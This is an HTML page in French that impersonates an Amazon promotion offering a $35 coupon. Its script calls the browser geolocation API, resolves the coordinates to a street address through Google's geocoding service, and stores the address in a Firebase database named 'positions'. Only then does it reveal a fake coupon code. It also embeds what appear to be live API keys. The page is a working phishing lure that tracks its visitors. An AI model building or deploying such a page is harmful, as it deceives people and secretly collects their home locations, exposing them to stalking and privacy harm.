<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Offre Amazon</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #f5f7fa, #c3cfe2);
      text-align: center;
      padding: 60px 20px;
      color: #333;
    }

    .box {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
      max-width: 400px;
      margin: auto;
    }

    h1 {
      color: #e47911;
    }

    p {
      font-size: 18px;
      margin-bottom: 30px;
    }

    button {
      background-color: #e47911;
      color: white;
      border: none;
      padding: 15px 25px;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #c6670d;
    }

    #couponCode {
      font-size: 22px;
      font-weight: bold;
      color: #28a745;
      margin-top: 20px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="box">
    <h1>üéÅ Gagnez 35‚ÄØ$ de rabais sur Amazon !</h1>
    <p>Appuyez sur le bouton pour recevoir votre code de coupon exclusif.</p>
    <button onclick="getLocation()">Voir le coupon</button>
    <div id="couponCode">Votre code : <span>AMAZONGIFT2025</span></div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyAWRLIgDsE6FLlrm-nEqpeIJE-cntA8J3Y",
      authDomain: "reward-2abec.firebaseapp.com",
      projectId: "reward-2abec",
      storageBucket: "reward-2abec.firebasestorage.app",
      messagingSenderId: "947040532960",
      appId: "1:947040532960:web:6d49404439b34ce1c91385"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    window.getLocation = async function () {
      if (!navigator.geolocation) {
        alert("La g√©olocalisation n'est pas support√©e par ce navigateur.");
        return;
      }

      navigator.geolocation.getCurrentPosition(async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;

        try {
          const apiKey = "AIzaSyDQ39_sRnDsbBf1tarxE37kd9D9iPe5G5A";
          const res = await fetch(`https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lon}&key=${apiKey}`);
          const data = await res.json();

          if (data.status === "OK" && data.results.length > 0) {
            const result = data.results[0];
            const fullAdresse = result.formatted_address;
            const components = result.address_components;
            const getComp = (type) => components.find(c => c.types.includes(type))?.long_name || "";

            const docData = {
              date: new Date().toISOString(),
              latitude: lat,
              longitude: lon,
              rue: getComp("route") + " " + getComp("street_number"),
              ville: getComp("locality"),
              codePostal: getComp("postal_code"),
              pays: getComp("country"),
              fullAdresse: fullAdresse
            };

            await addDoc(collection(db, "positions"), docData);
            document.getElementById("couponCode").style.display = "block";
          } else {
            alert("Impossible de r√©cup√©rer l‚Äôadresse exacte.");
            console.error("Erreur Google API :", data);
          }

        } catch (error) {
          alert("Erreur r√©seau ou API.");
          console.error("Erreur :", error);
        }
      }, (error) => {
        alert("Erreur de g√©olocalisation : " + error.message);
      });
    };
  </script>
</body>
</html>
